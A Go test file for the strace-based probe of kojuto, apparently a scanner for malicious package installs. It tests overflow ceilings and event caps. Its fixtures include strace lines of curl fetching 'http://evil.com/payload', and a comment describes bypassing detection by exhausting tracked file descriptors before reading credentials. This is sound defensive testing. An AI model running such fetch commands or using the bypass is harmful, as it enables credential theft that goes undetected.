package probe

import (
	"io"
	"strconv"
	"strings"
	"testing"

	"github.com/RalianENG/kojuto/internal/types"
)

// TestParseState_FDCeilingFlagsOverflow pins the fail-closed behavior of
// the dirfd map ceiling. Silently refusing new entries would let a package
// open maxTrackedFDs files, blind the resolver, and then read credentials
// through a dirfd-relative openat that no longer resolves to a sensitive
// path — a detection bypass costing nothing but a loop.
func TestParseState_FDCeilingFlagsOverflow(t *testing.T) {
	s := NewParseState()
	if s.Overflowed() {
		t.Fatal("fresh ParseState reports overflow")
	}

	s.fdEntries = maxTrackedFDs
	s.recordFD(1, 3, "/etc")

	if !s.Overflowed() {
		t.Error("recordFD past the ceiling did not flag overflow")
	}
	if got := s.resolveFD(1, 3); got != "" {
		t.Errorf("entry was stored past the ceiling: resolveFD = %q, want empty", got)
	}
}

// TestParseState_FDOverwriteIsFree checks that fd reuse — the common case
// after close() — replaces an entry instead of being charged against the
// ceiling. Without this the map would "fill up" on a long but entirely
// legitimate install that cycles a few descriptors.
func TestParseState_FDOverwriteIsFree(t *testing.T) {
	s := NewParseState()
	s.recordFD(1, 3, "/etc")
	s.recordFD(1, 3, "/var")

	if s.fdEntries != 1 {
		t.Errorf("fdEntries = %d after overwriting one fd, want 1", s.fdEntries)
	}
	if got := s.resolveFD(1, 3); got != "/var" {
		t.Errorf("resolveFD = %q, want /var (latest open wins)", got)
	}
}

// TestParseState_CreatedPathCeilingFlagsOverflow mirrors the fd test for the
// create->execute->delete correlation set.
func TestParseState_CreatedPathCeilingFlagsOverflow(t *testing.T) {
	s := NewParseState()
	for i := range maxTrackedPaths {
		s.createdTmpFiles["/tmp/fill/"+strconv.Itoa(i)] = true
	}

	trackTmpFileCreation(`openat(AT_FDCWD, "/tmp/payload.bin", O_WRONLY|O_CREAT|O_TRUNC, 0644) = 3`, s)

	if !s.Overflowed() {
		t.Error("tracking a new /tmp creation past the ceiling did not flag overflow")
	}
	if s.createdTmpFiles["/tmp/payload.bin"] {
		t.Error("entry was stored past the ceiling")
	}
}

// TestContainerStrace_EventCapStopsRetaining pins that a probe which has
// already handed MaxProbeEvents to its consumer stops retaining and counts
// the remainder as dropped. dropped > 0 is what outputReport maps to
// `inconclusive`, so this is the path that stops a truncated trace from
// being reported as clean.
//
// emitted is seeded rather than driven up with 250k real lines: the guard is
// what is under test, not the size of the constant.
func TestContainerStrace_EventCapStopsRetaining(t *testing.T) {
	c := NewContainerStrace()
	c.emitted = MaxProbeEvents

	drained := make(chan int)
	go func() {
		n := 0
		for range c.Events() {
			n++
		}
		drained <- n
	}()

	lines := strings.Repeat(
		`[pid 777] execve("/usr/bin/curl", ["curl", "http://evil.com/payload"], 0x...) = 0`+"\n", 3)

	done := make(chan struct{})
	c.parseStraceOutput(io.NopCloser(strings.NewReader(lines)), done)
	<-done
	close(c.events)

	if got := <-drained; got != 0 {
		t.Errorf("consumer received %d events past the cap, want 0", got)
	}
	if c.Dropped() < 3 {
		t.Errorf("Dropped() = %d, want at least 3 (one per discarded event)", c.Dropped())
	}
}

// TestContainerStrace_UnderCapStillDelivers guards against the cap check
// swallowing normal traffic.
func TestContainerStrace_UnderCapStillDelivers(t *testing.T) {
	c := NewContainerStrace()

	drained := make(chan []types.SyscallEvent)
	go func() {
		var evts []types.SyscallEvent
		for e := range c.Events() {
			evts = append(evts, e)
		}
		drained <- evts
	}()

	done := make(chan struct{})
	c.parseStraceOutput(io.NopCloser(strings.NewReader(
		`[pid 777] execve("/usr/bin/curl", ["curl", "http://evil.com/payload"], 0x...) = 0`+"\n")), done)
	<-done
	close(c.events)

	evts := <-drained
	if len(evts) != 1 {
		t.Fatalf("got %d events, want 1", len(evts))
	}
	if c.Dropped() != 0 {
		t.Errorf("Dropped() = %d, want 0", c.Dropped())
	}
}
